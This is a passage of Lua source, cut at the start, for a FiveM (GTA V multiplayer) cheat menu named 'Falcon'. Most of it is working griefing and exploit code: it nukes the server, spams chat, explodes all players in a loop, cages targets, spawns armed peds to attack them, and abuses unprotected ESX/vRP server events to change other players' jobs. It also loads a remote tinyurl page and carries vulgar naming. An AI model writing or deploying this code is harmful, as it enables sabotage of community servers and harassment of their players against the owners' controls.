		local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

		if itemsCount > 1 and isCurrent then
			selectedItem = tostring(selectedItem)
		end

		if Falcon.Button2(text, items, itemsCount, currentIndex) then
			selectedIndex = currentIndex
			callback(currentIndex, selectedIndex)
			return true
		elseif isCurrent then
			if currentKey == keys.left then
				if currentIndex > 1 then currentIndex = currentIndex - 1
				elseif currentIndex == 1 then currentIndex = 1 end
			elseif currentKey == keys.right then
				if currentIndex < itemsCount then currentIndex = currentIndex + 1
				elseif currentIndex == itemsCount then currentIndex = itemsCount end
			end
		else
			currentIndex = selectedIndex
		end
		callback(currentIndex, selectedIndex)
		return false
	end

	local function drawButton2(text, items, itemsCount, currentIndex)
		local x = menus[currentMenu].x + menus[currentMenu].width / 2
		local multiplier = nil

		if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
			multiplier = optionCount
		elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
			multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
		end

		if multiplier then
			local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
			local backgroundColor = nil
			local textColor = nil
			local subTextColor = nil
			local shadow = false

			if menus[currentMenu].currentOption == optionCount then
				backgroundColor = menus[currentMenu].menuFocusBackgroundColor
				textColor = menus[currentMenu].menuFocusTextColor
				subTextColor = menus[currentMenu].menuFocusTextColor
			else
				backgroundColor = menus[currentMenu].menuBackgroundColor
				textColor = menus[currentMenu].menuTextColor
				subTextColor = menus[currentMenu].menuSubTextColor
				shadow = true
			end

			local sliderWidth = ((menus[currentMenu].width / 3) / itemsCount)
			local subtractionToX = ((sliderWidth * (currentIndex + 1)) - (sliderWidth * currentIndex)) / 2

			local XOffset = 0.1 -- Default value in case of any error?
			local stabilizer = 1

			-- Draw order from top to bottom
			if itemsCount >= 40 then
				stabilizer = 1.005
			end

			drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor) -- Button Rectangle -2.15
			drawRect(((menus[currentMenu].x + 0.1075) + (subtractionToX * itemsCount)) / stabilizer, y, sliderWidth * (itemsCount - 1), buttonHeight / 2, {r = 110, g = 110, b = 110, a = 150}) -- Slide Outline
			drawRect(((menus[currentMenu].x + 0.1075) + (subtractionToX * currentIndex)) / stabilizer, y, sliderWidth * (currentIndex - 1), buttonHeight / 2, {r = 200, g = 200, b = 200, a = 140}) -- Slide
			drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow) -- Text

			--Ugly Code, I'll refactor it later
			local CurrentItem = tostring(items[currentIndex])
			if string.len(CurrentItem) == 1 then XOffset = 0.1050
			elseif string.len(CurrentItem) == 2 then XOffset = 0.1025
			elseif string.len(CurrentItem) == 3 then XOffset = 0.10015
			elseif string.len(CurrentItem) == 4 then XOffset = 0.1085
			elseif string.len(CurrentItem) == 5 then XOffset = 0.1070
			elseif string.len(CurrentItem) >= 6 then XOffset = 0.1055
			end
			-- roundNum seems kinda useless since I'm adjusting every position manually based on the lenght of the string. As stated above, I'll refactor this part later.
			-- (sliderWidth * roundNum((itemsCount / 2), 3)
			drawText(items[currentIndex], ((menus[currentMenu].x + XOffset) + 0.04) / stabilizer, y - (buttonHeight / 2.15) + buttonTextYOffset, buttonFont, {r = 255, g = 255, b = 255, a = 255}, buttonScale, false, shadow) -- Current Item Text
		end
	end

	-- Getting the center of an odd number of itemsCount (breaks on negative numbers)
	function roundNum(num, numDecimalPlaces)
		local mult = 10^(numDecimalPlaces or 0)
		return math.floor(num * mult + 0.5) / mult
	  end

	function Falcon.Button2(text, items, itemsCount, currentIndex)
		local buttonText = text

		if menus[currentMenu] then
			optionCount = optionCount + 1

			local isCurrent = menus[currentMenu].currentOption == optionCount

			drawButton2(text, items, itemsCount, currentIndex)

			if isCurrent then
				if currentKey == keys.select then
					PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
					debugPrint(buttonText..' button pressed')
					return true
				elseif currentKey == keys.left or currentKey == keys.right then
					PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
				end
			end

			return false
		else
			debugPrint('Failed to create '..buttonText..' button: '..tostring(currentMenu)..' menu doesn\'t exist')

			return false
		end
	end

	-- Texture Handling
	Citizen.CreateThread(function()
		local p = 1
		while true do
			if theme == "Falcon" then -- static effect for Falcon theme - https://github.com/esc0rtd3w/illicit-sprx/blob/master/main/illicit/textures.h
				if p == 5 then p = 1 else p = p + 1 end
				for i = 1, #menulist do
					if Falcon.IsMenuOpened(menulist[i]) then Falcon.SetTitleBackgroundSprite(menulist[i], 'digitaloverlay', 'static' .. p) end
				end
			else -- Base textures
				for i = 1, #menulist do Falcon.SetTitleBackgroundSprite(menulist[i], 'mpinventory', 'mp_specitem_weed_black') end
			end
			Wait(100)
		end
	end)

	Resources = GetResources()

	ResourcesToCheck = {
			-- ESX
			"es_extended", "esx_dmvschool", "esx_policejob", "",
			-- VRP
			"vrp", "vrp_trucker", "vrp_TruckerJob"
	}

	Citizen.CreateThread(function()
		if mpMessage then ShowMPMessage(startMessage, subMessage, 50) else ShowInfo(startMessage .. " " .. subMessage) end
		ShowInfo(motd3)


		-- COMBO BOXES

		local currThemeIndex = 1
		local selThemeIndex = 1

		local currFaceIndex = GetPedDrawableVariation(PlayerPedId(), 0) + 1
		local selFaceIndex = GetPedDrawableVariation(PlayerPedId(), 0) + 1

		local currFtextureIndex = GetPedTextureVariation(PlayerPedId(), 0) + 1
		local selFtextureIndex = GetPedTextureVariation(PlayerPedId(), 0) + 1

		local currHairIndex = GetPedDrawableVariation(PlayerPedId(), 2) + 1
		local selHairIndex = GetPedDrawableVariation(PlayerPedId(), 2) + 1

		local currHairTextureIndex = GetPedTextureVariation(PlayerPedId(), 2) + 1
		local selHairTextureIndex = GetPedTextureVariation(PlayerPedId(), 2) + 1

		local currMaskIndex = GetPedDrawableVariation(PlayerPedId(), 1) + 1
		local selMaskIndex = GetPedDrawableVariation(PlayerPedId(), 1) + 1

		local currHatIndex = GetPedPropIndex(PlayerPedId(), 0) + 1
		local selHatIndex = GetPedPropIndex(PlayerPedId(), 0) + 1

		if currHatIndex == 0 or currHatIndex == 1 then -- No Hat
			currHatIndex = 9
			selHatIndex = 9
		end

		local currHatTextureIndex = GetPedPropTextureIndex(PlayerPedId(), 0)
		local selHatTextureIndex = GetPedPropTextureIndex(PlayerPedId(), 0)

		-- Fixes the Hat starting at index 1 not displaying because its value is 0
		if currHatTextureIndex == -1 or currHatTextureIndex == 0 then
			currHatTextureIndex = 1
			selHatTextureIndex = 1
		end

		local currPFuncIndex = 1
		local selPFuncIndex = 1

		local currVFuncIndex = 1
		local selVFuncIndex = 1
		
		local currSeatIndex = 1
		local selSeatIndex = 1

		local currTireIndex = 1
		local selTireIndex = 1

		local currNoclipSpeedIndex = 1
		local selNoclipSpeedIndex = 1

		local currForcefieldRadiusIndex = 1
		local selForcefieldRadiusIndex = 1

		local currFastRunIndex = 1
		local selFastRunIndex = 1

		local currFastSwimIndex = 1
		local selFastSwimIndex = 1

		local currObjIndex = 1
		local selObjIndex = 1

		local currRotationIndex = 3
		local selRotationIndex = 3

		local currDirectionIndex = 1
		local selDirectionIndex = 1

		local Outfits = {}
		local currClothingIndex = 1
		local selClothingIndex = 1

		local currGravIndex = 3
		local selGravIndex = 3

		local currSpeedIndex = 1
		local selSpeedIndex = 1

		local currAttackTypeIndex = 1
		local selAttackTypeIndex = 1

		local currESPDistance = 3
		local selESPDistance = 3

		local currESPRefreshIndex = 1
		local selESPRefreshIndex = 1

		local currAimbotBoneIndex = 1
		local selAimbotBoneIndex = 1

		local currSaveLoadIndex1 = 1
		local selSaveLoadIndex1 = 1
		local currSaveLoadIndex2 = 1
		local selSaveLoadIndex2 = 1
		local currSaveLoadIndex3 = 1
		local selSaveLoadIndex3 = 1
		local currSaveLoadIndex4 = 1
		local selSaveLoadIndex4 = 1
		local currSaveLoadIndex5 = 1
		local selSaveLoadIndex5 = 1

		local currRadioIndex = 1
		local selRadioIndex = 1

		local currWeatherIndex = 1
		local selWeatherIndex = 1

		-- GLOBALS
		local TrackedPlayer = nil
		local SpectatedPlayer = nil
		local FlingedPlayer = nil
		local PossessingVeh = false
		local pvblip = nil
		local pvehicle = nil
		local pvehicleText = ""
		local IsPlayerHost = nil

		if NetworkIsHost() then
			IsPlayerHost = "~g~Yes"
		else
			IsPlayerHost = "~r~No"
		end

		local savedpos1 = nil
		local savedpos2 = nil
		local savedpos3 = nil
		local savedpos4 = nil
		local savedpos5 = nil

		-- TOGGLES
		local includeself = true
		local Collision = true
		local objVisible = true
		local PlaceSelf = true
		local SpawnInAir = true
		local SpawnEngineOn = true

		-- TABLES
		SpawnedObjects = {}

		-- MAIN MENU
		Falcon.CreateMenu('Falcon', menuName .. ' v' .. version)
		Falcon.SetSubTitle('Falcon', 'By oFlaqme#1149')

		-- MAIN MENU SUBMENUS
		Falcon.CreateSubMenu('player', 'Falcon', 'Player Options')
		Falcon.CreateSubMenu('self', 'Falcon', 'Self Options')
		Falcon.CreateSubMenu('weapon', 'Falcon', 'Weapon Options')
		Falcon.CreateSubMenu('vehicle', 'Falcon', 'Vehicle Options')
		Falcon.CreateSubMenu('world', 'Falcon', 'World Options')
		Falcon.CreateSubMenu('teleport', 'Falcon', 'Teleport Options')
		Falcon.CreateSubMenu('misc', 'Falcon', 'Misc Options')
		Falcon.CreateSubMenu('lua', 'Falcon', 'Lua Options')
		Falcon.CreateSubMenu('lynx', 'Falcon', 'Lynx bro....')
		-- PLAYER MENU SUBMENUS
		Falcon.CreateSubMenu('allplayer', 'player', 'All Players')
		Falcon.CreateSubMenu('playeroptions', 'player', 'Player Options')
		Falcon.CreateSubMenu('troll', 'playeroptions', 'Troll Options')
		Falcon.CreateSubMenu('jobsplayers', 'playeroptions', 'Jobs Options')


		-- SELF MENU SUBMENUS
		Falcon.CreateSubMenu('appearance', 'Falcon', 'Appearance Options')
		Falcon.CreateSubMenu('modifiers', 'self', 'Modifiers Options')

		-- APPEARANCE SUBMENUS
		Falcon.CreateSubMenu('modifyskintextures', 'appearance', "Modify Skin Textures")
		Falcon.CreateSubMenu('modifyhead', 'modifyskintextures', "Available Drawables")
		Falcon.CreateSubMenu('skinsmodels', 'appearance', "Skin Models")

		-- WEAPON MENU SUBMENUS

		Falcon.CreateSubMenu('WeaponCustomization', 'weapon', 'Weapon Customization')
		Falcon.CreateSubMenu('weaponspawner', 'weapon', 'Weapon Spawner')
		Falcon.CreateSubMenu('melee', 'weaponspawner', 'Melee Weapons')
		Falcon.CreateSubMenu('pistol', 'weaponspawner', 'Pistols')
		Falcon.CreateSubMenu('smg', 'weaponspawner', 'SMGs / MGs')
		Falcon.CreateSubMenu('shotgun', 'weaponspawner', 'Shotguns')
		Falcon.CreateSubMenu('assault', 'weaponspawner', 'Assault Rifles')
		Falcon.CreateSubMenu('sniper', 'weaponspawner', 'Sniper Rifles')
		Falcon.CreateSubMenu('thrown', 'weaponspawner', 'Thrown Weapons')
		Falcon.CreateSubMenu('heavy', 'weaponspawner', 'Heavy Weapons')

		-- VEHICLE MENU SUBMENUS
		Falcon.CreateSubMenu('vehiclespawner', 'vehicle', 'Vehicle Spawner')
		Falcon.CreateSubMenu('vehiclemods', 'vehicle', 'Vehicle Mods')
		Falcon.CreateSubMenu('vehiclemenu', 'vehicle', 'Vehicle Control Menu')

		-- VEHICLE SPAWNER MENU
		Falcon.CreateSubMenu('compacts', 'vehiclespawner', 'Compacts')
		Falcon.CreateSubMenu('sedans', 'vehiclespawner', 'Sedans')
		Falcon.CreateSubMenu('suvs', 'vehiclespawner', 'SUVs')
		Falcon.CreateSubMenu('coupes', 'vehiclespawner', 'Coupes')
		Falcon.CreateSubMenu('muscle', 'vehiclespawner', 'Muscle')
		Falcon.CreateSubMenu('sportsclassics', 'vehiclespawner', 'Sports Classics')
		Falcon.CreateSubMenu('sports', 'vehiclespawner', 'Sports')
		Falcon.CreateSubMenu('super', 'vehiclespawner', 'Super')
		Falcon.CreateSubMenu('motorcycles', 'vehiclespawner', 'Motorcycles')
		Falcon.CreateSubMenu('offroad', 'vehiclespawner', 'Off-Road')
		Falcon.CreateSubMenu('industrial', 'vehiclespawner', 'Industrial')
		Falcon.CreateSubMenu('utility', 'vehiclespawner', 'Utility')
		Falcon.CreateSubMenu('vans', 'vehiclespawner', 'Vans')
		Falcon.CreateSubMenu('cycles', 'vehiclespawner', 'Cycles')
		Falcon.CreateSubMenu('boats', 'vehiclespawner', 'Boats')
		Falcon.CreateSubMenu('helicopters', 'vehiclespawner', 'Helicopters')
		Falcon.CreateSubMenu('planes', 'vehiclespawner', 'Planes')
		Falcon.CreateSubMenu('service', 'vehiclespawner', 'Service')
		Falcon.CreateSubMenu('commercial', 'vehiclespawner', 'Commercial')

		-- VEHICLE MODS SUBMENUS
		Falcon.CreateSubMenu('vehiclecolors', 'vehiclemods', 'Vehicle Colors')
		Falcon.CreateSubMenu('vehiclecolors_primary', 'vehiclecolors', 'Primary Color')
		Falcon.CreateSubMenu('vehiclecolors_secondary', 'vehiclecolors', 'Secondary Color')

		Falcon.CreateSubMenu('primary_classic', 'vehiclecolors_primary', 'Classic Colors')
		Falcon.CreateSubMenu('primary_matte', 'vehiclecolors_primary', 'Matte Colors')
		Falcon.CreateSubMenu('primary_metal', 'vehiclecolors_primary', 'Metals')

		Falcon.CreateSubMenu('secondary_classic', 'vehiclecolors_secondary', 'Classic Colors')
		Falcon.CreateSubMenu('secondary_matte', 'vehiclecolors_secondary', 'Matte Colors')
		Falcon.CreateSubMenu('secondary_metal', 'vehiclecolors_secondary', 'Metals')

		Falcon.CreateSubMenu('vehicletuning', 'vehiclemods', 'Vehicle Tuning')

		-- WORLD MENU SUBMENUS
		Falcon.CreateSubMenu('objectspawner', 'Falcon', 'Object Spawner')
		Falcon.CreateSubMenu('objectlist', 'objectspawner', 'Select To Delete')
		Falcon.CreateSubMenu('weather', 'world', 'Weather Changer ~r~(CLIENT SIDE)')
		Falcon.CreateSubMenu('time', 'world', 'Time Changer')

		-- MISC MENU SUBMENUS
		Falcon.CreateSubMenu('esp', 'misc', 'ESP & Visual Options')
		Falcon.CreateSubMenu('webradio', 'misc', 'Web Radio')
		Falcon.CreateSubMenu('credits', 'misc', 'Credits')
		Falcon.CreateSubMenu('InfoMenu', 'misc', 'Info')

		-- TELEPORT MENU SUBMENUS
		Falcon.CreateSubMenu('saveload', 'teleport', 'Save/Load Position')
		Falcon.CreateSubMenu('pois', 'teleport', 'POIs')
		--fuck server
		Falcon.CreateSubMenu('fuckserver', 'Falcon', 'Fuck Server')

		-- LUA MENU SUBMENUS
		Falcon.CreateSubMenu('esx', 'lua', 'ESX Options')
		Falcon.CreateSubMenu('vrp', 'lua', 'vRP Options')
		Falcon.CreateSubMenu('other', 'lua', 'Esx Jobs')
		Falcon.CreateSubMenu('money', 'vrp', 'Spawn Money')

		Falcon.InitializeTheme()

		while true do

			-- MAIN MENU
			if Falcon.IsMenuOpened('Falcon') then
				if Falcon.MenuButton('🌐~y~Plz Press Meeeeee', 'lynx') then
				elseif Falcon.MenuButton('~y~« ~r~∑ ~h~~y~» ~r~Player Options', 'player') then
				elseif Falcon.MenuButton('~y~« ~r~∑ ~h~~y~» ~b~Self Options', 'self') then
				elseif Falcon.MenuButton('~y~« ~r~∑ ~h~~y~» ~g~Models Options', 'appearance') then
				elseif Falcon.MenuButton('~y~« ~r~∑ ~h~~y~» ~y~Weapon Options', 'weapon') then
				elseif Falcon.MenuButton('~y~« ~r~∑ ~h~~y~» ~p~Vehicle Options', 'vehicle') then
				elseif Falcon.MenuButton('~y~« ~r~∑ ~h~~y~» ~c~World Options', 'world') then
				elseif Falcon.MenuButton('~y~« ~r~∑ ~h~~y~» ~m~Teleport Options', 'teleport') then
				elseif Falcon.MenuButton('~y~« ~r~∑ ~h~~y~» ~u~Misc Options', 'misc') then
				elseif Falcon.MenuButton('~y~« ~r~∑ ~h~~y~» ~o~Objects Options', 'objectspawner') then
				elseif Falcon.MenuButton('~y~« ~r~∑ ~h~~y~» ~r~Fuck Server', 'fuckserver') then
				elseif Falcon.MenuButton('~y~« ~r~∑ ~h~~y~» ~b~Lua Options', 'lua') then
				elseif Falcon.Button('~y~« ~r~∑ ~h~~y~» ~r~Kill Menu') then break
				end
				ShowInfo(motd2)
				ShowInfo(motd)
				ShowInfo(motd5)

			-- PLAYER OPTIONS MENU
			elseif Falcon.IsMenuOpened('player') then
				if Falcon.MenuButton('All Players', 'allplayer') then
					else
					local playerlist = GetActivePlayers()
					for i = 1, #playerlist do
						local currPlayer = playerlist[i]
						if Falcon.MenuButton("ID: ~y~[" .. GetPlayerServerId(currPlayer) .. "] ~s~" .. GetPlayerName(currPlayer), 'playeroptions') then
							selectedPlayer = currPlayer end
					end
				end

			elseif Falcon.IsMenuOpened('lynx') then
				if Falcon.Button("~y~Bro Lynx is trash") then
			elseif Falcon.Button("~y~Plz don't use lynx") then
			elseif Falcon.Button("~y~If u use lynx i will terminate you") then
			elseif Falcon.Button("~r~USE EXIA' MENUES BROTHER") then
			end


			--Fuck server
			elseif Falcon.IsMenuOpened('fuckserver') then
				if Falcon.CheckBox("Include Self", includeself, "No", "Yes") then
					includeself = not includeself
				elseif Falcon.Button("~r~Nuke Server") then
				ShowInfo("~y~Fucking Players...")
					nukeserver()
				elseif Falcon.Button("~h~~y~»~r~ Spam Chat") then
					RapeAllFunc() 
				elseif Falcon.Button("~y~Set ~s~All Nearby Vehicles Plate Text") then
				local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
				for k in EnumerateVehicles() do
					RequestControlOnce(k)
					SetVehicleNumberPlateText(k, plateInput)
				end
				elseif Falcon.CheckBox("~y~Make ~s~All Cars ~y~Fly", FlyingCars) then
					FlyingCars = not FlyingCars
				elseif Falcon.CheckBox("~y~Set ~s~The World On ~y~Fire", WorldOnFire) then
					WorldOnFire = not WorldOnFire
					if WorldOnFire then
						wofDUI = CreateDui("https://tinyurl.com/y6e2qu9e", 1, 1)
					else
						DestroyDui(wofDUI)
					end
				elseif Falcon.Button("~y~Close ~s~the whole square") then
						x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
						roundx = tonumber(string.format('%.2f', x))
						roundy = tonumber(string.format('%.2f', y))
						roundz = tonumber(string.format('%.2f', z))
						local e8 = -145066854
						RequestModel(e8)
						while not HasModelLoaded(e8) do
							Citizen.Wait(0)
						end
						local e9 = CreateObject(e8, 258.91, -933.1, 26.21, true, true, false)
						local ea = CreateObject(e8, 200.91, -874.1, 26.21, true, true, false)
						local e92 = CreateObject(e8, 126.52, -933.2, 26.21, true, true, false)
						local ea2 = CreateObject(e8, 184.52, -991.2, 26.21, true, true, false)
						SetEntityHeading(e9, 158.41)
						SetEntityHeading(ea, 90.51)
						SetEntityHeading(e92, 332.41)
						SetEntityHeading(ea2, 260.51)
						FreezeEntityPosition(e9, true)
						FreezeEntityPosition(ea, true)
						FreezeEntityPosition(e92, true)
						FreezeEntityPosition(ea2, true)
		elseif Falcon.Button("~y~Spawn ~p~Lion ~s~all Players") then
						local mtlion = "A_C_MtLion"
						local plist = GetActivePlayers()
							for i = 0, #plist do
							local co = GetEntityCoords(GetPlayerPed(i))
							RequestModel(GetHashKey(mtlion))
							Citizen.Wait(50)
							if HasModelLoaded(GetHashKey(mtlion)) then
								local ped =
									CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
								NetworkRegisterEntityAsNetworked(ped)
								if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
									local ei = PedToNet(ped)
									NetworkSetNetworkIdDynamic(ei, false)
									SetNetworkIdCanMigrate(ei, true)
									SetNetworkIdExistsOnAllMachines(ei, true)
									Citizen.Wait(50)
									NetToPed(ei)
									TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
								elseif IsEntityDead(GetPlayerPed(i)) then
									TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
								else
									Citizen.Wait(0)
								end
							end
						end
			elseif Falcon.Button("~y~Spawn ~p~SWAT ~s~all Players ") then
						local swat = "s_m_y_swat_01"
						local bR = "WEAPON_ASSAULTRIFLE"
						local plist = GetActivePlayers()
							for i = 0, #plist do
							local coo = GetEntityCoords(GetPlayerPed(i))
							RequestModel(GetHashKey(swat))
							Citizen.Wait(50)
							if HasModelLoaded(GetHashKey(swat)) then
								local ped =
									CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
									CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
									CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
									CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
								NetworkRegisterEntityAsNetworked(ped)
								if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
									local ei = PedToNet(ped)
									NetworkSetNetworkIdDynamic(ei, false)
									SetNetworkIdCanMigrate(ei, true)
									SetNetworkIdExistsOnAllMachines(ei, true)
									GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
									SetPedCanSwitchWeapon(ped, true)
									NetToPed(ei)
									TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
								elseif IsEntityDead(GetPlayerPed(i)) then
									TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
								else
									Citizen.Wait(0)
								end
							end
						end
		 elseif Falcon.Button('~o~Make all Players hamburger head') then
						local plist = GetActivePlayers()
							for i = 0, #plist do
							if IsPedInAnyVehicle(GetPlayerPed(i), true) then
								local eb = 'xs_prop_hamburgher_wl'
								local ec = -145066854
								while not HasModelLoaded(ec) do
									Citizen.Wait(0)
									RequestModel(ec)
								end
								local ed = CreateObject(ec, 0, 0, 0, true, true, true)
								AttachEntityToEntity(
									ed,
									GetVehiclePedIsIn(GetPlayerPed(i), false),
									GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
									0,
									0,
									-1.0,
									0.0,
									0.0,
									0,
									true,
									true,
									false,
									true,
									1,
									true
								)
							else
								local eb = 'xs_prop_hamburgher_wl'
								local ec = GetHashKey(eb)
								while not HasModelLoaded(ec) do
									Citizen.Wait(0)
									RequestModel(ec)
								end
								local ed = CreateObject(ec, 0, 0, 0, true, true, true)
								AttachEntityToEntity(
									ed,
									GetPlayerPed(i),
									GetPedBoneIndex(GetPlayerPed(i), 0),
									0,
									0,
									-1.0,
									0.0,
									0.0,
									0,
									true,
									true,
									false,
									true,
									1,
									true
								)
							end
						end
				elseif Falcon.Button("~y~Fuck Up The Map (Irreversible!)  [WIP]") then
					if not FuckMap then
						ShowInfo("~b~Fucking Up Map")
						FuckMap = true
					else
						ShowInfo("~r~Map Already Fucked")
					end
				elseif Falcon.Button("Explode All Players") then
					ExplodeAll(includeself)
				elseif Falcon.CheckBox("Explode All Players ~r~(LOOP)", ExplodingAll) then
					ExplodingAll = not ExplodingAll
				elseif Falcon.Button("Give All Players Weapons") then
					GiveAllPlayersWeapons(includeself)
				elseif Falcon.Button("Remove All Players Weapons") then
					StripAll(includeself)
				elseif Falcon.Button("Kick All Players From Vehicle") then
					KickAllFromVeh(includeself)
				end


				elseif Falcon.IsMenuOpened('jobsplayers') then
				if Falcon.Button("~r~Remove Job") then
					TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(selectedPlayer))
				elseif Falcon.Button("~s~Recruit~c~ Mechanic") then
				local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
					TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "mecano", result)
				elseif Falcon.Button("~s~Recruit~b~ Police") then
				local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
					TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "police", result)
					TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "police", result)
					TriggerServerEvent('Corujas RP-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "police", result)
				elseif Falcon.Button("~s~Recruit~c~ Mafia") then
				local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
					TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "mafia", result)
					TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "mafia", result)
				elseif Falcon.Button("~s~Recruit~p~ Gang") then
				local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
					TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "gang", result)
					TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "gang", result)
				elseif Falcon.Button("~s~Recruit~y~ Taxi") then
				local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
					TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "taxi", result)
					TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "taxi", result)
				elseif Falcon.Button("~s~Recruit~r~ Inem") then
				local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
					TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "ambulance", result)
					TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "ambulance", result)
				end


				 elseif Falcon.IsMenuOpened('troll') then
				 if Falcon.Button('~r~Attack ~s~Windmill') then
						local bH = CreateObject(GetHashKey('prop_windmill_01'), 0, 0, 0, true, true, true)


						AttachEntityToEntity(
							bH,
							GetPlayerPed(selectedPlayer),
							GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005),
							0.4,
							0,
							0,
							0,
							270.0,
							60.0,
							true,
							true,
							false,
							true,
							1,
							true
						)
						elseif Falcon.Button('~r~Attack ~s~Weed Plant') then
			 local bI = CreateObject(GetHashKey('Prop_weed_01'), 0, 0, 0, true, true, true)
						AttachEntityToEntity(
							bI,
							GetPlayerPed(selectedPlayer),
							GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005),
							0.4,
							0,
							0,
							0,
							270.0,
							60.0,
							true,
							true,
							false,
							true,
							1,
							true
						)
				 elseif Falcon.Button('~r~Attack ~s~Giant Orange') then
				 local bJ = CreateObject(GetHashKey('prop_juicestand'), 0, 0, 0, true, true, true)
						AttachEntityToEntity(
							bJ,
							GetPlayerPed(selectedPlayer),
							GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005),
							0.4,
							0,
							0,
							0,
							270.0,
							60.0,
							true,
							true,
							false,
							true,
							1,
							true
						)
				 elseif Falcon.Button('~r~Cage ~s~Player') then
						x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
						roundx = tonumber(string.format('%.2f', x))
						roundy = tonumber(string.format('%.2f', y))
						roundz = tonumber(string.format('%.2f', z))
						local e7 = 'prop_fnclink_05crnr1'
						local e8 = GetHashKey(e7)
						RequestModel(e8)
						while not HasModelLoaded(e8) do
							Citizen.Wait(0)
						end
						local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
						local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
						SetEntityHeading(e9, -90.0)
						SetEntityHeading(ea, 90.0)
						FreezeEntityPosition(e9, true)
						FreezeEntityPosition(ea, true)
				elseif Falcon.Button("~r~Spawn ~s~Swat army with ~y~AK") then
						local bQ = "s_m_y_swat_01"
						local bR = "WEAPON_ASSAULTRIFLE"
						for i = 0, 10 do
							local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
							RequestModel(GetHashKey(bQ))
							Citizen.Wait(50)
							if HasModelLoaded(GetHashKey(bQ)) then
								local ped =
									CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
									CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
								NetworkRegisterEntityAsNetworked(ped)
								if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
									local ei = PedToNet(ped)
									NetworkSetNetworkIdDynamic(ei, false)
									SetNetworkIdCanMigrate(ei, true)
									SetNetworkIdExistsOnAllMachines(ei, true)
									Citizen.Wait(50)
									NetToPed(ei)
									GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
									SetEntityInvincible(ped, true)
									SetPedCanSwitchWeapon(ped, true)
									TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
								elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
									TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
								else
									Citizen.Wait(0)
								end
							end
						end
				elseif Falcon.Button("~r~Spawn ~s~Stripper army with ~y~RGQ") then
						local bQ = "csb_stripper_02"
						local bR = "weapon_rpg"
						for i = 0, 10 do
							local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
							RequestModel(GetHashKey(bQ))
							Citizen.Wait(50)
							if HasModelLoaded(GetHashKey(bQ)) then
								local ped =
									CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, true, true)
								NetworkRegisterEntityAsNetworked(ped)
								if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
